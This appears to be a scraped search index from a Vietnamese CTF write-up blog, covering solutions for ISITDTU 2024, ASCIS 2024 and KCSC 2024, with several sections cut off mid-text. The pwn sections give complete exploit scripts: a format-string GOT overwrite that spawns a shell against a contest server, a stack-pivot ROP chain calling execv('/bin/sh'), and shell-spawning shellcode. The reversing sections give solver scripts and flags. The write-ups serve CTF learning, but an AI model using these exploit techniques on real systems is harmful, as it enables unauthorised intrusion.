asm(\"\"\" nop nop mov rax, 0x68732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \"\"\") p.send(payload2) p.interactive() FLAG: ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda} ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:6:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"pwn/Game of Luck Challenge Information 43 solves / 100 pts Given files: chal Description: nc 152.69.210.130 2004 ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:7:0","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x01 Overview \u0026 Find bug Chương trình chính sau khi được rename lại như sau void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { init(); welcome(); get_random_number(); game(); } trong đó hàm game là hàm xử lý chính Nhìn tổng quan, có 2 lựa chọn cho người chơi: Lấy giá trị ngẫu nhiên trong khoảng [0, 100] qua hàm get_random_number. Chơi game đoán giá trị ngẫu nhiên thông qua hàm play. __int64 play() { unsigned int v0; // eax int random_number; // [rsp+8h] [rbp-8h] v0 = clock(); srand(v0); random_number = rand(); printf(\"Enter your guess: \"); if ( get_int_number() != random_number ) { puts(\"Incorrect!\"); exit(0); } puts(\"Correct!\"); if ( ++point == 10 ) { enter_name(); // fmt bug exit(0); } return 0LL; } Ở trong hàm play này, ta thấy được có bug Format String ở hàm enter_name. __int64 enter_name() { char buf[264]; // [rsp+0h] [rbp-110h] BYREF unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"Enter your name: \"); read(0, buf, 216uLL); printf(buf, point); return 0LL; } ","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:7:1","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"0x02 Exploit Chúng ta chỉ có 1 bug duy nhất FSB trong hàm play. Mình sẽ tiếp tục tìm kiếm xem có cách nào để tái sử dụng bug này được nhiều lần hay không. Quay về hàm game, đây là đoạn code khiến mình quan tâm nhất. unsigned int choice; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); while ( 1 ) { while ( 1 ) { printf(\"Score: %u points\\n\", point); puts(\"0. Lucky Number\\n1. Play\\n2. Exit\"); __isoc99_scanf(\"%1u\", \u0026choice); // bypass with \"-\" while ( getchar() != 10 ) ; if ( choice != 68 ) break; enter_name(); // choice = 68 } [...] } Nhập duy nhất một chữ số unsigned int, nghĩa là chỉ được nhập trong khoảng [0, 9]. Vì vậy, việc choice = 68 là bất khả thi. Có 2 điều chúng ta cần quan tâm ở đây đó là: Nếu nhập input không đúng với fmt của hàm scanf thì choice sẽ không bị thay đổi giá trị. Đứng ở góc độ hàm main nhìn xuống, giá trị choice trong hàm game nằm ở vị trí rbp-0xC, đây cũng chính là địa chỉ chứa giá trị random của hàm get_random_number. Tới đây thì ý tưởng đã rõ. Chúng ta sẽ spam mãi cho tới khi lấy được lucky number = 68. Tiếp tục nhập choice với - để sử dụng được bug FMT nhiều lần. Bên cạnh đó, nhìn vào hàm get_int_number sẽ thấy nó cho phép nhập vào mảng buf. Ta sẽ overwrite atoi@got thành system, khi đó atoi(\"/bin/sh\") sẽ là system(\"/bin/sh\"). int get_int_number() { char buf[24]; // [rsp+0h] [rbp-20h] BYREF unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); read(0, buf, 0xFuLL); return atoi(buf); } Full exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\"./chal\") libc = ELF(\"//usr/lib/x86_64-linux-gnu/libc.so.6\") # ld = ELF(\"./ld-2.35.so\") context.update(os = \"linux\", arch = \"amd64\", log_level = \"debug\", terminal = \"cmd.exe /c start wsl\".split(), binary = exe) def debug(): gdb.attach(p, gdbscript = \"\"\" b* 0x40157A continue \"\"\") pause() # debug() while True: # p = process(exe.path) p = remote(\"152.69.210.130\", 2004) sl = p.sendline sa = p.sendafter sla = p.sendlineafter rl = p.recvline ru = p.recvuntil ru(b\"Lucky number: \") lucky_number = int(rl().strip(), 10) if lucky_number == 68: break else: p.close() sl(b\"-\") payload = b\"%67$p\" sla(b\"name: \", payload) libc_leak = int(rl().strip(), 16) libc_base = libc_leak - libc.symbols[\"__libc_start_main\"] - 128 system = libc_base + libc.symbols[\"system\"] log.info(f\"libc base = {hex(libc_base)}\") log.info(f\"libc leak = {hex(libc_leak)}\") log.info(f\"system = {hex(system)}\") package = { (system \u003e\u003e 0 ) \u0026 0xFFFF : exe.got[\"atoi\"], (system \u003e\u003e 16) \u0026 0xFFFF : exe.got[\"atoi\"] + 2, (system \u003e\u003e 32) \u0026 0xFFFF : exe.got[\"atoi\"] + 4 } sorted_package = sorted(package) payload = f\"%{sorted_package[0]}c%12$hn\".encode() payload += f\"%{sorted_package[1] - sorted_package[0]}c%13$hn\".encode() payload += f\"%{sorted_package[2] - sorted_package[1]}c%14$hn\".encode() payload = payload.ljust(0x30, b\"P\") payload += flat( package[sorted_package[0]], package[sorted_package[1]], package[sorted_package[2]] ) sl(b\"-\") sla(b\"name: \", payload) sl(b\"1\") sla(b\"guess: \", b\"/bin/sh\") p.interactive() FLAG: ISITDTU{a0e1948f76e189794b7377d8e3b585bfa99d7ed0de7e6a6ff01c2fd95bdf3f72} Challenge Information 9 solves / 463 pts / by kinjazz Given files: 2much rev/FlagCpp Challenge Information 6 solves / 486 pts / by ks75vl Given files: FlagCpp_5C9F861EFCC1AFF273C435E3CC988438.zip Description: Trust me, this program was written in C++. pwn/no_name Challenge Information 29 solves / 100 pts Given files: no_name.zip Description: nc 152.69.210.130 1337 forensics/CPUsage Challenge Information 37 solves / 100 pts / by M4shl3 Given files: https://drive.proton.me/urls/5MM9NY7SZW#O3lmkiJIBJzr Description: My friend noticed a high usage of CPU after he opened his laptop, I just take a memory dump of his laptop, and needs you to investigate it. Q1- What is the name of the malicious process, full path of the process, parent process id? Q2- what is the ip that process communicate with, family name of the malware Format flag: ISITDTU{processName-FullPath-ID_ip-FamilyNam","date":"2024-11-19","objectID":"/2024-isitdtu-quals/:7:2","tags":["Reverse-Engineering","Pwnable","ISITDTU","2024"],"title":"ISITDTU Quals 2024","uri":"/2024-isitdtu-quals/"},{"categories":null,"content":"Sinh viên với An toàn Thông tin là cuộc thi CTF danh giá nhất cho sinh viên ở Việt Nam. Hằng năm, cuộc thi được tổ chức 3 vòng: khởi động, sơ khảo và chung khảo. Dưới đây là bài giải cho một số challenge pwnable và reversing ở các vòng thi của mình. Theo ý kiến cá nhân, các bài reversing thường khá khó và tốn nhiều công sức để phân tích nhưng rất thú vị. Ngược lại, các bài pwnable thì không quá mới lạ khi chỉ xoay quanh các bug cơ bản như Buffer Overflow, Format String Bug hay Use After Free, … \rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin: 0 auto 15px;\r}\r\r","date":"2024-10-19","objectID":"/2024-finalascis/:0:0","tags":["Reverse-Engineering","Pwnable","ASCIS","2024"],"title":"Sinh viên với An toàn Thông tin 2024","uri":"/2024-finalascis/"},{"categories":null,"content":"pwn/ROP Challenge Information Given files: ROP.zip ","date":"2024-10-19","objectID":"/2024-finalascis/:1:0","tags":["Reverse-Engineering","Pwnable","ASCIS","2024"],"title":"Sinh viên với An toàn Thông tin 2024","uri":"/2024-finalascis/"},{"categories":null,"content":"0x00. Overview Kiểm tra thông tin của binary và các lớp bảo vệ. ➜ pwn-ROP file chall chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=408b0fc1dee8dad901b33ff68c1e8179fef5bc89, not stripped gef➤ checksec Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial Đề bài cho một binary 64 bit, đã tắt canary và có thể ghi được GOT (Global Offset Table). Bên cạnh đó, đề bài còn cung cấp Dockerfile, mình sẽ build docker để lấy libc, ld trong docker trước. Ý tưởng đầu tiên của mình là sử dụng kỹ thuật ret2libc. ➜ pwn-ROP docker build . -t rop ➜ pwn-ROP docker run -p 5000:5000 --privileged -it rop ➜ pwn-ROP docker cp ee13afb344e4:/srv/usr/lib/x86_64-linux-gnu/libc.so.6 . ➜ pwn-ROP docker cp ee13afb344e4:/srv/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 . Dễ dàng thấy có bug Buffer Overflow trong hàm vuln(). Đặc biệt hơn khi không có bất cứ hàm nào in ra được output ngoài màn hình. Vì vậy kỹ thuật ret2libc nêu trên không thể sử dụng được. Kết hợp với việc GOT ghi đè được, mình có thể dùng kỹ thuật ret2dlresolve để giải hoặc stack pivot nhằm overwrite bảng GOT của alarm() thành execv(). Note Tại sao sử dụng execv() mà không phải execve() như thông thường? Do execv() yêu cầu tới tận 3 tham số, trong khi đó mình không thấy bất cứ gadget nào có thể thay đổi được giá trị thanh ghi rdx. Vì vậy mình đã sử dụng execv() với yêu cầu là 2 tham số và các giá trị rdi, rsi hoàn toàn kiểm soát được. ","date":"2024-10-19","objectID":"/2024-finalascis/:1:1","tags":["Reverse-Engineering","Pwnable","ASCIS","2024"],"title":"Sinh viên với An toàn Thông tin 2024","uri":"/2024-finalascis/"},{"categories":null,"content":"0x01. Stack Pivot Stack Pivot là một kỹ thuật đưa địa chỉ stack từ một số ngẫu nhiên do cơ chế ASLR thành địa chỉ tĩnh của binary nhằm thuận tiện cho việc xây dựng các ROP chain. Để sử dụng kỹ thuật này, đoạn assembly code thường được sử dụng là leave retn Đây chính là đoạn code mình sử dụng để thực thi stack pivot có địa chỉ 0x401249. .text:0000000000401249 lea rax, [rbp+buf] .text:000000000040124D mov edx, 48h ; 'H' ; nbytes .text:0000000000401252 mov rsi, rax ; buf .text:0000000000401255 mov edi, 0 ; fd .text:000000000040125A call _read .text:000000000040125F nop .text:0000000000401260 leave .text:0000000000401261 retn Nếu đoạn code trên được gọi, mình sẽ làm được: Ghi được dữ liệu vào rbp - 0x20 New RBP = [RBP] New RIP = [RBP + 8] \rTrước tiên, cần phải tính toán offset để ghi đè Saved RIP. Mảng buf nằm ở [rbp - 0x20] → ta cần 32 bytes để ghi đè nó. Mình sẽ thử viết 1 POC để trigger lỗi xem new RBP và new RIP sẽ có giá trị như nào. #!/usr/bin/env python3 from pwn import * import time exe = ELF('./chall_patched', checksec=False) libc = ELF('./libc.so.6', checksec=False) ld = ELF('./ld-linux-x86-64.so.2', checksec=False) context.update(arch='amd64', os='linux', log_level='debug', terminal='cmd.exe /c start wsl'.split(), binary=exe) p = process(exe.path) payload = flat( b'A' * 0x20, 0xdeedbeef, # New RBP b'B' * 8 # New RIP ) p.send(payload) p.interactive() Kết quả thu được như mình mong muốn, new RBP = 0xdeedbeef và new RIP = BBBBBBBB $rax : 0x30 $rbx : 0x0 $rcx : 0x00001555553fd7e2 → 0x5677fffff0003d48 (\"H=\"?) $rdx : 0x48 $rsp : 0x00007fffffffdfe8 → 0x4242424242424242 (\"BBBBBBBB\"?) $rbp : 0xdeedbeef $rsi : 0x00007fffffffdfc0 → 0x4141414141414141 (\"AAAAAAAA\"?) $rdi : 0x0 $rip : 0x0000000000401261 → \u003cvuln+002d\u003e ret $r8 : 0x00007fffffffdf30 → 0x0000000000000000 $r9 : 0x0 $r10 : 0x00001555552ef5e8 → 0x000f001200001a64 $r11 : 0x246 $r12 : 0x00007fffffffe108 → 0x00007fffffffe37e → \"/home/ducdatdau/ctfs/2024/ascis_final/pwn-ROP/chal[...]\" $r13 : 0x0000000000401262 → \u003cmain+0000\u003e endbr64 $r14 : 0x0000000000403e18 → 0x0000000000401180 → \u003c__do_global_dtors_aux+0000\u003e endbr64 $r15 : 0x0000155555554040 → 0x00001555555552e0 → 0x0000000000000000 $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ─────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdfe8│+0x0000: 0x4242424242424242 ← $rsp 0x00007fffffffdff0│+0x0008: 0x0000000000000001 0x00007fffffffdff8│+0x0010: 0x0000155555312d90 → 0xe80001b859e8c789 0x00007fffffffe000│+0x0018: 0x0000000000000000 0x00007fffffffe008│+0x0020: 0x0000000000401262 → \u003cmain+0000\u003e endbr64 0x00007fffffffe010│+0x0028: 0x00000001ffffe0f0 0x00007fffffffe018│+0x0030: 0x00007fffffffe108 → 0x00007fffffffe37e → \"/home/ducdatdau/ctfs/2024/ascis_final/pwn-ROP/chal[...]\" 0x00007fffffffe020│+0x0038: 0x0000000000000000 ───────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x40125a \u003cvuln+0026\u003e call 0x4010a0 \u003cread@plt\u003e 0x40125f \u003cvuln+002b\u003e nop 0x401260 \u003cvuln+002c\u003e leave ●→ 0x401261 \u003cvuln+002d\u003e ret [!] Cannot disassemble from $PC ───────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"chall_patched\", stopped 0x401261 in vuln (), reason: BREAKPOINT ─────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x401261 → vuln() ────────────────────────────────────────────────────────────────────────────────────────────────────────────── ","date":"2024-10-19","objectID":"/2024-finalascis/:1:2","tags":["Reverse-Engineering","Pwnable","ASCIS","2024"],"title":"Sinh viên với An toàn Thông tin 2024","uri":"/2024-finalascis/"},{"categories":null,"content":"0x02. Build payload Các công việc mình cần phải xử lý bây giờ là: Overwrite 2 bytes cuối cùng của GOT alarm() thành execv(). Do cùng phiên bản libc nên 12 bits cuối của các hàm libc luôn giữ nguyên. Ví dụ alarm = 0x1555553d3540 thì 540 luôn được giữ nguyên, overwrite 2 bytes cuối làm thay đổi giá trị 3. Lúc này sẽ cần bruteforce để tìm chính xác địa chỉ, xác suất thành công là 1/16 = 6.25%. Ghi chuỗi /bin/sh\\x00 lên bộ nhớ. [RSI] = 0, trong đó RSI là một địa chỉ hợp lệ. 1. Overwrite 2 bytes GOT alarm() Để overwrite, RBP - 0x20 = 0x404020 → RBP = 0x404040. Sau khi ghi được 2 bytes cuối, [RBP] = [0x404040] = 0, dẫn tới việc không thể tiếp tục ghi được các giá trị khác vào bộ nhớ nữa. Mình xây dựng lại cấu trúc bộ nhớ như sau, trong đó [0x404040] tiếp tục được trỏ tới 1 vùng nhớ không có dữ liệu ở phía dưới để phục vụ cho công việc [RSI] = 0, đồng thời 12 bits cuối cùng của alarm@got cũng bị overwrite. pop_rdi = 0x401247 pop_rbp = 0x40119d ret = 0x40101a alarm_got = 0x404020 payload = flat( b'A' * 0x20, alarm_got + 0x40, 0x401249 ) input('input 1: stack pivot') p.send(payload) payload = flat( alarm_got + 0x100, 0x401249, b'B' * 0x10, alarm_got + 0x20, 0x401249 ) input('input 2: stack pivot new area') p.send(payload) input('input 3: change 2 bytes') p.send(b'\\xc0\\x41') Kết quả thu được như mình mong muốn, 2 bytes cuối của alarm@got bị ghi thành /x41/xc0, RBP = 0x404120. gef➤ x/gx 0x404020 0x404020 \u003calarm@got.plt\u003e: 0x00001555553d41c0 gef➤ x/gx $rbp 0x404120: 0x0000000000000000 \r2. Write /bin/sh\\x00 and seup [RSI] = 0 Công việc cuối cùng là viết /bin/sh\\x00, setup cho RSI = 0 và xây ROP chain để gọi execv. Memory layout được mình thiết kế như sau Payload hoạt động nhưng phải bật option NOASLR. Quay lại vấn đề bruteforce, mình sẽ bỏ script trong vòng While để liên tục bruteforce đến khi nào có đúng địa chỉ execv. #!/usr/bin/env python3 from pwn import * import time exe = ELF('./chall_patched', checksec=False) libc = ELF('./libc.so.6', checksec=False) ld = ELF('./ld-linux-x86-64.so.2', checksec=False) context.update(arch='amd64', os='linux', log_level='debug', terminal='cmd.exe /c start wsl'.split(), binary=exe) while True: def GDB(): gdb.attach(p, gdbscript=''' b *0x401261 continue ''') pause() # GDB() p = process(exe.path) pop_rdi = 0x401247 pop_rbp = 0x40119d ret = 0x40101a alarm_got = 0x404020 payload = flat( b'A' * 0x20, alarm_got + 0x40, 0x401249 ) time.sleep(0.1) log.info('input 1: stack pivot') p.send(payload) payload = flat( alarm_got + 0x100, 0x401249, b'B' * 0x10, alarm_got + 0x20, 0x401249 ) time.sleep(0.1) log.info('input 2: stack pivot new area') p.send(payload) log.info('input 3: change 2 bytes') p.send(b'\\xc0\\x41') # payload = flat( # b'/bin/sh\\x00', # pop_rdi, # alarm_got + 0xe0, # exe.plt['alarm'], # alarm_got + 0xe0, # 0x401249 # ) payload = flat( 0, b'/bin/sh\\x00', b'C' * 0x10, 0xdeedbeef, pop_rdi, alarm_got + 0xe8, exe.plt['alarm'] ) time.sleep(0.1) log.info('input 4: write /bin/sh') p.send(payload) try: time.sleep(0.1) log.info('input 5: getshell') p.send(b'\\x00') time.sleep(0.1) p.sendline(b'echo PWNED') p.recvuntil(b'PWNED') break except EOFError: p.close() p.interactive() ","date":"2024-10-19","objectID":"/2024-finalascis/:1:3","tags":["Reverse-Engineering","Pwnable","ASCIS","2024"],"title":"Sinh viên với An toàn Thông tin 2024","uri":"/2024-finalascis/"},{"categories":null,"content":"rev/Trust Me! Challenge Information Given files: TRUSTME.rar (password: infected). ","date":"2024-10-19","objectID":"/2024-finalascis/:2:0","tags":["Reverse-Engineering","Pwnable","ASCIS","2024"],"title":"Sinh viên với An toàn Thông tin 2024","uri":"/2024-finalascis/"},{"categories":null,"content":"Solutions for some challenges in KCSC Recruitment 2024","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":" img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin: 15px auto; } ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:0:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/riel warmup Challenge Information 4 solves / 460 pts / by 13r_ə_Rɪst Given files: chall.exe Description: w-weo cum to REV, các bạn có thể tải ida tại đây Solution Load file đề bài cho vào IDA64, chuyển qua tab code assembly, ta có thể thấy được các phần của flag. Ghép chúng lại và ta được flag KCSC{have_u_known_IDA_after_this_real_warmup} ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:1:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/Elif Challenge Information 8 solves / 280 pts / by noobmannn Given files: FlagChecker1.py Description: Có phải thứ này là code Al không vậy??? Solution Đọc qua file được cho, ta thấy có rất nhiều phương trình có dạng như này inp[30] + inp[44] + inp[16] + inp[38] + inp[47] + inp[7] != 398 Để giải được dạng bài này, ta chỉ cần sử dụng Z3 và thu được flag là KCSC{700_much_1f-3l53_f0r_fl46ch3ck3r!!!7ry_z3\u003c3} from z3 import * inp = [Int(f\"inp[{i}]\") for i in range(49)] s = Solver() s.add(inp[0] == ord(\"K\")) s.add(inp[1] == ord(\"C\")) s.add(inp[2] == ord(\"S\")) s.add(inp[3] == ord(\"C\")) s.add(inp[4] == ord(\"{\")) s.add(inp[48] == ord(\"}\")) s.add(inp[30] + inp[44] + inp[16] + inp[38] + inp[47] + inp[7] == 398) s.add(inp[41] + inp[22] + inp[38] + inp[33] + inp[28] + inp[20] == 451) s.add(inp[10] + inp[3] + inp[39] + inp[14] + inp[4] + inp[47] == 440) s.add(inp[2] + inp[12] + inp[45] + inp[4] + inp[42] + inp[30] == 581) s.add(inp[36] + inp[36] + inp[26] + inp[43] + inp[21] + inp[1] == 587) s.add(inp[16] + inp[3] + inp[16] + inp[20] + inp[38] + inp[39] == 274) s.add(inp[28] + inp[39] + inp[18] + inp[38] + inp[47] + inp[8] == 372) s.add(inp[25] + inp[19] + inp[36] + inp[19] + inp[20] + inp[31] == 470) s.add(inp[44] + inp[27] + inp[5] + inp[41] + inp[16] + inp[42] == 565) s.add(inp[46] + inp[35] + inp[8] + inp[1] + inp[4] + inp[47] == 447) s.add(inp[41] + inp[20] + inp[42] + inp[40] + inp[3] + inp[43] == 503) s.add(inp[36] + inp[4] + inp[21] + inp[46] + inp[34] + inp[38] == 532) s.add(inp[43] + inp[45] + inp[3] + inp[45] + inp[3] + inp[17] == 382) s.add(inp[24] + inp[2] + inp[6] + inp[2] + inp[25] + inp[1] == 490) s.add(inp[38] + inp[41] + inp[33] + inp[34] + inp[21] + inp[42] == 569) s.add(inp[17] + inp[38] + inp[1] + inp[15] + inp[46] + inp[35] == 364) s.add(inp[40] + inp[17] + inp[34] + inp[33] + inp[39] + inp[19] == 398) s.add(inp[18] + inp[21] + inp[4] + inp[27] + inp[19] + inp[29] == 541) s.add(inp[30] + inp[34] + inp[42] + inp[26] + inp[18] + inp[47] == 588) s.add(inp[23] + inp[24] + inp[30] + inp[1] + inp[13] + inp[7] == 471) s.add(inp[17] + inp[16] + inp[32] + inp[16] + inp[15] + inp[14] == 343) s.add(inp[30] + inp[10] + inp[24] + inp[3] + inp[40] + inp[3] == 519) s.add(inp[10] + inp[34] + inp[27] + inp[38] + inp[46] + inp[40] == 480) s.add(inp[6] + inp[6] + inp[46] + inp[35] + inp[5] + inp[13] == 357) s.add(inp[18] + inp[16] + inp[5] + inp[6] + inp[12] + inp[32] == 411) s.add(inp[1] + inp[3] + inp[37] + inp[4] + inp[22] + inp[44] == 514) s.add(inp[26] + inp[11] + inp[12] + inp[47] + inp[22] + inp[2] == 541) s.add(inp[32] + inp[32] + inp[18] + inp[34] + inp[31] + inp[37] == 454) s.add(inp[38] + inp[25] + inp[1] + inp[23] + inp[28] + inp[27] == 403) s.add(inp[37] + inp[11] + inp[2] + inp[24] + inp[39] + inp[21] == 457) s.add(inp[21] + inp[4] + inp[3] + inp[11] + inp[42] + inp[2] == 588) s.add(inp[11] + inp[36] + inp[27] + inp[1] + inp[18] + inp[19] == 549) s.add(inp[16] + inp[18] + inp[37] + inp[41] + inp[25] + inp[45] == 446) s.add(inp[19] + inp[19] + inp[18] + inp[8] + inp[25] + inp[14] == 453) s.add(inp[19] + inp[2] + inp[40] + inp[34] + inp[27] + inp[5] == 461) s.add(inp[48] + inp[41] + inp[33] + inp[41] + inp[23] + inp[37] == 533) s.add(inp[45] + inp[9] + inp[8] + inp[32] + inp[4] + inp[26] == 531) s.add(inp[47] + inp[27] + inp[2] + inp[32] + inp[3] + inp[38] == 393) s.add(inp[32] + inp[27] + inp[2] + inp[34] + inp[27] + inp[14] == 506) s.add(inp[24] + inp[14] + inp[39] + inp[20] + inp[3] + inp[17] == 365) s.add(inp[10] + inp[17] + inp[43] + inp[28] + inp[48] + inp[48] == 565) s.add(inp[35] + inp[47] + inp[27] + inp[42] + inp[35] + inp[37] == 415) s.add(inp[10] + inp[37] + inp[37] + inp[44] + inp[21] + inp[15] == 502) s.add(inp[9] + inp[44] + inp[9] + inp[48] + inp[38] + inp[15] == 600) s.add(inp[16] + inp[47] + inp[12] + inp[27] + inp[39] + inp[16] == 386) s.add(inp[2] + inp[37] + inp[32] + inp[41] + inp[9] + inp[13] == 485) s.add(inp[25] + inp[18] + inp[25] + inp[41] + inp[40] + inp[11] == 566) s.add(inp[36] + inp[37] + in","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:2:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/Go Challenge Information 4 solves / 460 pts / by noobmannn Given files: FlagChecker2 Description: Thứ này khó nhìn quá :((( Bạn có thể giúp tôi xử lý nó được không??? Solution Đây là một file binary được viết bằng Go. Sau một hồi phân tích kết hợp debug, mình đoán đây là đoạn code check độ dài input. Từ đây, có thể suy đoán được độ dài input là 51. if ( v10[1] != 51LL ) { v14 = \u0026unk_4A5580; v15 = \u0026off_4DBC00; fmt_Fprintln(); os_Exit(); input = v10; } Đoạn mã check flag nằm ở dưới đây for ( i = 0LL; i \u003c 51; i = v4 + 1 ) { if ( (unsigned __int64)i \u003e= input[1] ) runtime_panicIndex(); v4 = i; v5 = i - (i \u0026 0xFFFFFFFFFFFFFFE0LL); if ( v5 \u003e= 32 ) runtime_panicIndex(); if ( *(\u0026check + i) != ((unsigned __int8)key[v5] ^ (unsigned __int64)*(unsigned __int8 *)(i + *input)) ) { v7 = i; v12 = \u0026unk_4A5580; v13 = \u0026off_4DBC10; fmt_Fprintln(); os_Exit(); input = v10; v4 = v7; } } Đoạn kiểm tra trên có thể được mô tả như sau: input[i] ^ key[i] == check[i] Thực hiện debug, mình có viết 1 script nhỏ để lấy toàn bộ giá trị của mảng check trong IDA Python import idc start = 0x000000C0000D7D80 end = start + 51 * 8 ans = [] for i in range(start, end, 8): ans.append(idc.get_wide_byte(i)) print(ans) # [18, 27, 5, 115, 26, 112, 81, 72, 87, 50, 8, 67, 6, 94, 5, 93, 27, 91, 5, 25, 110, 0, 124, 41, 1, 63, 64, 6, 15, 1, 35, 11, 106, 7, 97, 85, 0, 117, 93, 24, 83, 90, 102, 74, 106, 81, 2, 73, 67, 76, 72] Sau khi đã có đầy đủ dữ liệu, ta dễ dàng viết lại thuật toán giải mã và thu được flag KCSC{7h15_15_345y60l4n6_ch4ll3n63_7ea2da17_\u003c3\u003c3!!!} key = \"YXV0aG9ybm9vYm1hbm5uZnJvbWtjc2M=\" check = [18, 27, 5, 115, 26, 112, 81, 72, 87, 50, 8, 67, 6, 94, 5, 93, 27, 91, 5, 25, 110, 0, 124, 41, 1, 63, 64, 6, 15, 1, 35, 11, 106, 7, 97, 85, 0, 117, 93, 24, 83, 90, 102, 74, 106, 81, 2, 73, 67, 76, 72] for i in range(len(check)): print(chr(ord(key[i % len(key)]) ^ check[i]), end=\"\") ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:3:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/Time travel Challenge Information 3 solves / 482 pts / by 13r_ə_Rɪst Given files: TimeTravel.zip Description: Vì bí idea nên tôi nhờ người khác làm giúp chall này. Không biết cụ thể là khi nào, chắc tác giả đang đứng đâu đó trên dòng sông thời gian… Hint: Chẳng thứ gì nằm ngoài sự kiểm soát của kiểu dữ liệu… Solution Load file vào IDA64, ta thấy đoạn code của chương trình chính rất ngắn gọn. Chương trình khởi tạo seed để gọi hàm rand(), mở file enc.txt và ghi dữ liệu bị encrypt vào file. Ý tưởng để giải bài này rất đơn giản. Vì format flag là KCSC{ vậy nên ta sẽ có được 5 giá trị random đầu tiên. Tiếp đến, ta sẽ bruteforce seed để tìm ra seed chính xác của tác giả. #include \u003ccstdio\u003e#include \u003ccstdlib\u003e int randomArray[6] = {35, 43, 46, 133, 76}; int main() { for (long int s = 0; s \u003c 4294967295; s++) { printf(\"seed = %ld\\n\", s); srand(s); int cnt = 0; for (int i = 0; i \u003c 5; i++) { int tmp = rand() \u0026 0xff; if (tmp != randomArray[i]) break; else cnt++; } if (cnt == 5) return 0; } return 0; } // seed = 16777215 Công việc còn lại là là xor ngược lại để lấy flag. Kết quả thu được là KCSC{0xffffff_is_1970-07-14,I_created_this_challenge_at_\"the_end\"_of_time} #include \u003ccstdio\u003e#include \u003ccstdlib\u003e int encryptedFlag[74] = { 104, 104, 125, 198, 55, 142, 253, 235, 52, 254, 23, 254, 157, 40, 224, 4, 112, 133, 183, 68, 104, 55, 192, 251, 34, 201, 160, 73, 189, 42, 182, 207, 184, 69, 189, 68, 80, 135, 177, 72, 243, 201, 124, 35, 184, 249, 46, 131, 189, 238, 168, 217, 8, 239, 55, 152, 28, 118, 197, 19, 246, 240, 220, 14, 42, 81, 189, 212, 35, 100, 132, 83, 225, 75 }; int main() { srand(16777215); for (int i = 0; i \u003c 74; i++) { int tmp = rand() \u0026 0xff; printf(\"%c\", encryptedFlag[i] ^ tmp); } return 0; } ","date":"2024-09-10","objectID":"/2024-kcsc-recruitment/:4:0","tags":["Reverse-Engineering","KCSC Recruitment","2024"],"title":"KCSC Recruitment 2024","uri":"/2024-kcsc-recruitment/"},{"categories":null,"content":"rev/Từng Quen Challenge Information 1 solve / 500 pts / by 1conmeo Given files: important_note.txt mem.DMP sample.exe Description: Benjamin bị kẻ xấu loMbeoS mã hóa mất 1 file quan trọng, hãy giúp anh ấy khôi phục lại file này. Benj fan WREN EVANS Solution Load file đề bài cho vào IDA64, dưới đây là phần chính của chương trình. Ta thấy chương trình tạo 16 số random, đổi 4 số random cuối bằng giá trị có sẵn. Ở phần mã hóa, ta có thể tóm gọn lại như sau encryptedFlag[i] ^= randomArray[i % 16] Do flag format là KCSC{ ta sẽ xor ngược lại để tính được 5 giá trị random đầu tiên. Sau đó sẽ bruteforce tất cả các seed để tìm ra seed chính xác của tác giả. Đây là đoạn code để mình lấy 5 giá trị random đầu tiên randomArray = [0] * 16 randomArray[12] = 0xCA randomArray[13] = 0xFE randomArray[14] = 0xBE randomArray[15] = 0xEF with open(\"important_note.txt\", \"rb\") as file: data = file.read() encodedflag = [] for i in data: encodedflag.append(i) print(f\"Encodedflag = {encodedflag}\") flag = 